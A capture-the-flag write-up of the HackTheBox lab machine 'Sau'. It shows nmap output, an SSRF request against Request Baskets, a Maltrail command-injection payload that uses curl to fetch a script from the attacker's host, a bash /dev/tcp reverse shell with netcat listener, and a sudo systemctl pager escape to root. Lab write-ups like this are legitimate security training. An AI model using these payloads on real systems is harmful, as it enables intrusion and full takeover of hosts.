# Sau -HackTheBox

-------------------------------------------------------------------

Difficulty: Easy

Points: 30

## Introduction

Sau is the amazing machine from hackthebox, where the initial access is through exploiting **SSRF**, where the internal service which is maltrail is vulnerable to command injection, after getting in we can do a very cool thing to get root access.

## Initial Access

---------------------------------------------------

First, we run nmap scan to see the open ports:

```bash
sudo nmap -sC -sT -sV -A -oN nmap 10.10.11.224
```

The output is as follows:

```bash
# Nmap 7.94 scan initiated Fri Aug 18 19:47:59 2023 as: nmap -sC -sT -sV -A -oN nmap/initial 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.34s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
144/tcp   filtered news
3920/tcp  filtered exasoftport1
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 18 Aug 2023 14:19:41 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 18 Aug 2023 14:19:04 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 18 Aug 2023 14:19:06 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94%I=7%D=8/18%Time=64DF7DD8%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2018\x20Aug\x20
SF:2023\x2014:19:04\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2018\x20Aug\x20
SF:2023\x2014:19:06\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(K
SF:erberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options
SF::\x20nosniff\r\nDate:\x20Fri,\x2018\x20Aug\x202023\x2014:19:41\x20GMT\r
SF:\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20nam
SF:e\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\$\
SF:n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/18%OT=22%CT=1%CU=39488%PV=Y%DS=2%DC=T%G=Y%TM=64DF7E6
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=109%GCD=2%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11
OS:NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53
OS:CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   451.34 ms 10.10.14.1
2   451.81 ms 10.10.11.224

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 18 19:51:20 2023 -- 1 IP address (1 host up) scanned in 201.12 seconds

```

We can see that port 80, 144, 3920 are filtered, which means they are running internally on localhost and not on all interfaces.

But we can see that port 55555 is open, let's take a look on that.

#### SSRF - Request Basket

After opening the url in browser we can see that,
![alt text](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/Screenshot%20from%202023-08-20%2010-50-26.png?raw=true)
The Website is running request basket.

googling the recent vulnerabilities on request basket shows that This is vulnerabke to ***Server Side Request Forgery***
![exploit-db script](https://www.exploit-db.com/exploits/51675), shows that vulnerable endpoint is "/api/baskets/<any name>"

Let's recreate this exploit manually
We intercept the request and send it to repeater and then change the request method to post.
We will create a basket, with some json data and we give a name in /api/baskets/<here>
We change the Content-Type to application/json
Lastly, we add json data, here we make the server to hit us
![burp](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/burp.png?raw=true)

Finally, after we hit the page, https://10.10.14.224:55555/anybasket, we should get a hit
```bash
sudo nc -lnvp 80
```
![nc](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/nc.png?raw=true)

**We have confirmed that this is indeed vulnerable to SSRF**

#### Initial Access by exploiting command injection on maltrail

After confirming the SSRF we can make webserver to go to it's localhost where a service is running internally. (we saw filtered ports on nmap)
In BurpSuite, dont forget to change the basket name (here it is anybasket1)
```bash
POST /api/baskets/anybasket1 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/json
Content-Length: 141

{
	"forward_url": "http://127.0.0.1",
	"proxy_response": true,
	"insecure_tls": false,
	"expand_path": true,
	"capacity": 250
}
```

When we hit http://10.10.11.224:55555/anybasket1, we get the page of maltrail
![maltrail](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/maltrail.png?raw=true)

The version of maltrail is 0.53 which is vulnerable to command injection.
![maltrail exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)

The injectable parameter is in login where username parameter is vulnerable to command injection, 
In burpsuite, we do this to get code execution using ssrf.
![command injection](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/command-injection.png?raw=true)

Note: change basket name to anybasket2 in url (otherwise we get basket already exist error)
We see that after hitting http://10.10.11.224:5555/anybasket2, the server hangs for 10 sec and displays login failed.
***We have now confirmed command injection***
Let us get a reverse shell

We create shell.sh script,
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.107/4444 0>&1
```
We stand up a http server
```bash
sudo python3 -m http.server 80
```
In burpsuite change payload to download our script and store in /dev/shm,
```bash
POST /api/baskets/anybasket3 HTTP/1.1
Host: 10.10.11.224:55555
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/json
Content-Length: 160

{
	"forward_url": "http://127.0.0.1/login?username=;`curl+http://10.10.14.107/shell.sh+-o+/dev/shm/shell.sh`",
	"proxy_response": true,
	"insecure_tls": false,
	"expand_path": true,
	"capacity": 250
}
```
when we hit anybasket3, it downloads the file.
After the server downloads the file we run that file to get shell
WE stand up a listener to catch a shell
```bash
nc -lnvp 4444
```

In burpsuite,
![burpshell](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/burpshell.png?raw=true)

when we hit anybasket4 we should get a reverse shell
![shell](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/reverse-shell.png?raw=true)

we fix our tty,
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
ENTER twice

export TERM=xterm
```


#### Privilege Escalation
if we run ```sudo -l```

```bash
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
to get root shell, we do
```bash
sudo /usr/bin/systemctl status trail.service
```
Then we are in less output
if we press ```!sh```
we will get a root shell
![root](https://github.com/bsv1n4y/WriteUps/blob/main/HTB/Sau/root.png?raw=true)

That is the box, hope you guys enjoyed.
ThankYou.







